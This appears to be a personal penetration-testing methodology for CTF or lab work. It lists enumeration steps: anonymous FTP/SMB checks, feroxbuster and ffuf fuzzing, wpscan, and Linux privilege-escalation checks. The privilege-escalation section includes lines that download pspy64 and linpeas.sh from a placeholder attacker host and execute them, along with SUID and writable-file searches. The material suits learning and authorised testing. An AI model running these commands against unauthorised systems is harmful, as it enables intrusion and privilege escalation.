# Enumeration Methodology

### 1) Low Hanging Fruits

1) Check for anonymous access for FTP and SMB protocols

If yes, then grab any files you find within the network share or FTP folder

2) Check protocol/application version for possible public RCE or similar exploit (Example: EternalBlue)

3) Within a web page, check the page source for any comments that might have been left out (<!--) or interesting files that we might encounter

They may contain credentials, etc

### 2) Directory Fuzzing

Enumerate the directories of a webserver to check for admin pages, specific application directories, etc to further discover the webapp

You can also enumerate other interesting files like .txt, .conf or .php 

Wordlists to use: 

1) common.txt

2) directory-list-2.3-medium.txt

        feroxbuster -u http://DOMAIN.LOCAL/ -w /usr/share/wordlists/dirb/common.txt -C 404 -x txt

### 3) Subdomain/Vhost Fuzzing

Enumerate vhosts of the machine to discover another attack surface

Use the filters for false positives

Wordlists to use:

DNS-Subdomains-top-1million-11000.txt

        ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/DNS-Subdomains-top-1million-11000.txt -u http://domain.local/ -H 'Host: FUZZ.local.local' -fs NUM

### 4) CMS Enumeration

If we find a wordpress installation on the server, use wpscan tool to scan for information.

You can also conduct attacks with wpscan like bruteforce if we have a valid user.

Same methodology works with other CMS as well like Joomla and Drupal

    wpscan --url http://domain.local/

### 5) Linux Local Privilege Escalation LPE Enumeration

On a linux machine, we can do some checks to see if we can exploit them to do lateral movement, or even root the machine.

#### Checks:

1) Sudo privileges (Authenticated)

       sudo -l

2) SUID bit files

        find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null	

3) Open ports/services/applications within the machine

        ss -tulpn
        netstat -ano

4) Check for running processes either as root, or as another target user for lateral movement

        wget http://ATTACK_IP:PORT/pspy64

        chmod +x ./pspy64

        ./pspy64

5) Check detailed contents of a directory like hidden files, file size, ownership

        ls -lah

6) Automated Enumeration

        wget http://ATTACK_IP:PORT/linpeas.sh

        chmod +x ./linpeas.sh

        ./linpeas.sh

7) Interesting groups of the current user

        id

8) Environment Variables

        env

9) Command history

        history

10) Writeable files and directories of the current user

        find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u

11) Chech the current user's PATH variable contents

        echo $PATH

